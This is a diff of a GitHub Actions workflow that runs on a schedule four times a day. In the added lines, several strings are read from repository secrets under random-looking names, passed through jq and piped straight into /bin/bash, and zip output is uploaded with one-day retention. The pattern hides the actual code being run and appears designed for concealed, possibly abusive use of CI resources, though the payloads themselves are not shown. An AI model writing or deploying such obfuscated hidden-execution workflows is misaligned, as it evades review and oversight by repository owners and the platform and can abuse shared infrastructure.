@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '26 3,9,15,21 * * *'
+    - cron: '22 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,18 +18,19 @@ jobs:
           fetch-depth: 1
       - name: Start
         env:
-          wqsy6604: ${{ secrets.wqsy6604 }}
+          lb6: ${{ secrets.lb6 }}
         run: |
-          printf '%s' "$wqsy6604" | jq -r .xjh6445 | /bin/bash
-          printf '%s' "$vlc84" | jq -r .kgx6476 | /bin/bash
-          printf '%s' "$kw769" | jq -r .n80770 | /bin/bash
-          echo $zbc3 | jq -r .qjuai6 | /bin/bash
-          printf '%s' "$u8013" | jq -r .p9 | /bin/bash
+          printf '%s' "$lb6" | jq -r .l05344 | /bin/bash
+          echo $mpon156 | jq -r .gx874 | /bin/bash
+          printf '%s' "$dp4903" | jq -r .n2358 | /bin/bash
+          printf '%s' "$f131" | jq -r .wia02 | /bin/bash
+          printf '%s' "$tfs1" | jq -r .nyzl73050 | /bin/bash
+          echo $tm1854 | jq -r .v11 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: yzJ0ryey
+          name: CziYfzkH
           path: "*.zip"
           retention-days: 1
